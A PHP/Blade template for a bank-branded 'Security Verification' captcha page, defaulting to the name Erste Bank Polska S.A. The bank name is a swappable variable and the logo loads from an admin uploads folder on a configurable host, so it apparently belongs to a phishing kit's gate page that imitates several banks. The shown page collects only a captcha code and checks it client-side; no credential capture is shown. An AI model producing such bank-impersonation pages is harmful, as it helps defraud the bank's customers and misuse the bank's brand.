<?php
    if (!function_exists('generateCaptcha')) {
        function generateCaptcha($length = 5) {
            $characters = '23456789ABCDEFGHJKLMNPQRSTUVWXYZ';
            $captcha = '';
            for ($i = 0; $i < $length; $i++) {
                $captcha .= $characters[rand(0, strlen($characters) - 1)];
            }
            return $captcha;
        }
    }
    $captchaCode = generateCaptcha(5);
?>
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>{{ $bankName ?? 'Erste Bank Polska S.A' }} - Security Verification</title>
    <link rel="shortcut icon" href="{{ asset('images/favicon.ico') }}" />
    
    <!-- Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --primary-gradient: linear-gradient(135deg, #b34020 0%, #8c2d13 100%);
            --primary-hover: linear-gradient(135deg, #963418 0%, #70220c 100%);
            --bg-page: #f8f9fb;
            --card-bg: #ffffff;
            --text-main: #0f131a;
            --text-muted: #5f6b7c;
            --border-color: #e2e6ed;
            --brand-color: #b34020;
        }

        body.dark-theme {
            --bg-page: #0d1117;
            --card-bg: #161b22;
            --text-main: #f0f6fc;
            --text-muted: #8b949e;
            --border-color: #30363d;
            --brand-color: #d25a3a;
        }

        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            padding: 20px;
            font-family: 'Plus Jakarta Sans', sans-serif;
            background: var(--bg-page);
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(99, 102, 241, 0.06) 0%, transparent 45%),
                radial-gradient(circle at 90% 80%, rgba(59, 130, 246, 0.06) 0%, transparent 45%);
            color: var(--text-main);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .captcha-wrapper {
            width: 100%;
            max-width: 480px;
        }

        .captcha-card {
            background: var(--card-bg);
            border-radius: 24px;
            padding: 40px 36px;
            box-shadow: 0 25px 50px -12px rgba(15, 23, 42, 0.08);
            border: 1px solid var(--border-color);
            text-align: center;
            position: relative;
        }

        .brand-logo-img {
            max-height: 42px;
            max-width: 220px;
            object-fit: contain;
            margin-bottom: 24px;
        }

        .logo-fallback-wrap {
            display: inline-flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 24px;
        }

        .logo-fallback-icon {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #b34020, #8c2d13);
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #ffffff;
        }

        .logo-title {
            font-weight: 800;
            font-size: 17px;
            color: var(--text-main);
            text-transform: uppercase;
        }

        h3 {
            font-size: 24px;
            font-weight: 800;
            color: var(--text-main);
            margin: 0 0 8px 0;
            letter-spacing: -0.5px;
        }

        .instruction-text {
            font-size: 13.5px;
            color: var(--text-muted);
            line-height: 1.5;
            margin-bottom: 28px;
        }

        .captcha-display {
            background: #fdfaf8;
            border: 1.5px dashed #b34020;
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
        }

        body.dark-theme .captcha-display {
            background: #1c1411;
            border-color: #d25a3a;
        }

        #captcha {
            font-family: 'Courier New', Courier, monospace;
            font-size: 30px;
            font-weight: 800;
            letter-spacing: 12px;
            color: #b34020;
            user-select: none;
        }

        body.dark-theme #captcha {
            color: #d25a3a;
        }

        .refresh-btn {
            background: #fbf0ec;
            color: #b34020;
            border: none;
            border-radius: 8px;
            width: 36px;
            height: 36px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .refresh-btn:hover {
            background: #b34020;
            color: #ffffff;
            transform: rotate(180deg);
        }

        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
            background: #f8fafc;
            border: 1.5px solid var(--border-color);
            border-radius: 14px;
            margin-bottom: 24px;
            transition: all 0.2s ease;
        }

        body.dark-theme .input-wrapper {
            background: #0f172a;
        }

        .input-wrapper:focus-within {
            border-color: #b34020;
            background: #ffffff;
            box-shadow: 0 0 0 4px rgba(179, 64, 32, 0.12);
        }

        body.dark-theme .input-wrapper:focus-within {
            background: #0f172a;
        }

        .field-icon-left {
            padding-left: 16px;
            color: var(--text-muted);
            display: flex;
            align-items: center;
        }

        .form-control {
            border: none !important;
            background: transparent !important;
            height: 50px !important;
            width: 100%;
            font-size: 14px;
            font-weight: 500;
            color: var(--text-main) !important;
            padding: 0 16px !important;
            outline: none !important;
            box-shadow: none !important;
        }

        .btn-verify {
            width: 100%;
            height: 52px;
            background: linear-gradient(135deg, #4f46e5 0%, #3b82f6 100%);
            border: none;
            border-radius: 14px;
            color: #ffffff;
            font-size: 15px;
            font-weight: 700;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            cursor: pointer;
            transition: all 0.2s ease;
            box-shadow: 0 8px 22px rgba(79, 70, 229, 0.28);
        }

        .btn-verify:hover {
            transform: translateY(-1px);
            box-shadow: 0 12px 28px rgba(79, 70, 229, 0.38);
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            20%, 60% { transform: translateX(-6px); }
            40%, 80% { transform: translateX(6px); }
        }

        .shake {
            animation: shake 0.4s ease-in-out;
            border-color: #ef4444 !important;
        }
    </style>
</head>
<body>

    <div class="captcha-wrapper">
        <div class="captcha-card" id="captchaCard">
            
            <a href="#" style="text-decoration:none;">
                <?php if(!empty($logo)): ?>
                    <img src="//{{ $bank_url }}/admin/uploads/{{ $logo }}" alt="{{ $bankName ?? 'Logo' }}" class="brand-logo-img" onerror="this.style.display='none'; document.getElementById('logo-fallback-wrap').style.display='inline-flex';" />
                    <div id="logo-fallback-wrap" class="logo-fallback-wrap" style="display:none;">
                        <div class="logo-fallback-icon">
                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
                        </div>
                        <span class="logo-title">{{ $bankName ?? 'Erste Bank Polska S.A' }}</span>
                    </div>
                <?php else: ?>
                    <div class="logo-fallback-wrap">
                        <div class="logo-fallback-icon">
                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
                        </div>
                        <span class="logo-title">{{ $bankName ?? 'Erste Bank Polska S.A' }}</span>
                    </div>
                <?php endif; ?>
            </a>
            
            <h3>Security Verification</h3>
            
            <p class="instruction-text">
                Please confirm you are not a robot by verifying the auto-generated PIN code below to securely access {{ $bankName ?? 'Erste Bank Polska S.A' }}.
            </p>
            
            <div class="captcha-display">
                <span id="captcha"><?php echo $captchaCode; ?></span>
                <button type="button" class="refresh-btn" id="refreshBtn" title="Generate New Code">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
                </button>
            </div>
            
            <form id="captchaForm" action="{{ url('captcha') }}" method="GET" onsubmit="return validateForm(event);">
                <div class="input-wrapper" id="inputWrap">
                    <span class="field-icon-left">
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>
                    </span>
                    <input type="text" class="form-control" id="enteredCaptcha" placeholder="Enter Security Code" name="enteredCaptcha" required autocomplete="off">
                </div>
                
                <button type="submit" class="btn-verify">
                    <span>Verify & Continue</span>
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
                </button>
            </form>
        </div>
    </div>

    <script src="{{ asset('js/jquery.min.js') }}"></script>
    <script>
        function generateCaptchaStr(length) {
            var chars = '23456789ABCDEFGHJKLMNPQRSTUVWXYZ';
            var result = '';
            for (var i = 0; i < length; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return result;
        }

        $('#refreshBtn').click(function() {
            var newCode = generateCaptchaStr(5);
            $('#captcha').text(newCode);
            $('#enteredCaptcha').val('').removeClass('shake');
        });

        function validateForm(e) {
            var currentCaptcha = $('#captcha').text().trim().toUpperCase();
            var entered = $('#enteredCaptcha').val().trim().toUpperCase();

            if (entered !== currentCaptcha) {
                e.preventDefault();
                $('#inputWrap').addClass('shake');
                setTimeout(function() {
                    $('#inputWrap').removeClass('shake');
                }, 600);
                alert('Invalid security code. Please try again.');
                return false;
            }
            return true;
        }
    </script>
</body>
</html>
